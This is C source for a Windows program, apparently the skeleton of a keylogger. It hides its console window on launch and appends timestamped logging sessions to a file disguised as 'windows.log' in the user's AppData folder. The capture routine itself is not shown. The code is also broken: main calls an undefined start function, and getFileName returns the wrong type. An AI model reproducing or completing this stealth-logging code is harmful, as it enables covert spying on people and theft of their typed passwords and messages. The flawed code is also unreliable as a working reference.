#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
#include <stdlib.h>

bool invisible = true;
char fileName[MAX_PATH];

void hide(void)
{
    HWND stealth;

    /* Retrieves a handle to the top-level window whose class name and window name match the specified strings.
     1st Parmeter lpClassName: ConsoleWindowClass - Class Name
     2nd Parameter lpWindowName: parameter is NULL, all window names match.
     If the function succeeds, the return value is a handle to the window that has the specified class name and window name.
     If the function fails, the return value is NULL.
     */
    stealth = FindWindow("ConsoleWindowClass", NULL );
    ShowWindow(stealth, 0);
}

void init(void)
{
    // get path to appdata folder
    char* dest = "%appdata%\\windows.log";

    /* Expands the envirnment variable given into a usable path
     1st Parameter lpSrc: A buffer that contains one or more environment-variable strings in the form: %variableName%.
     2nd Parameter lpDst: A pointer to a buffer that receives the result of expanding the environment variable strings in the lpSrc buffer.
     3rd Parameter nSize: The maximum number of characters that can be stored in the buffer pointed to by the lpDst parameter.
     The return value is the fully expanded pathname.
    */
    ExpandEnvironmentStrings(dest, fileName, MAX_PATH);

    // open file
    FILE *file;
    file = fopen(fileName, "a+");
    time_t startTime = time(0);
    // see if file is empty
    long savedOffset = ftell(file);
    fseek(file, 0, SEEK_END);
    if (!ftell(file) == 0) fputc('\n', file);
    fseek(file, savedOffset, SEEK_SET);
    // print timestamp
    fputs("### Started logging at: ", file);
    fputs(ctime(&startTime), file);
    fclose(file);
}

void powerdown(void)
{
    // get path to appdata folder
    char* dest = "%appdata%\\windows.log";
    ExpandEnvironmentStrings(dest, fileName, MAX_PATH);

    // open file
    FILE *file;
    file = fopen(fileName, "a+");
    time_t endTime = time(0);
    fputs("\n### Stopped logging at: ", file);
    fputs(ctime(&endTime), file);
    fclose(file);
}

char getFileName()
{
    return fileName;
}

int main(int argc, char* argv[])
{
    int startKeyLogging(char* argv[]);

    if (invisible) hide();
    init();
    start(argv);
    atexit(powerdown);  // only works if process isn't killed
}
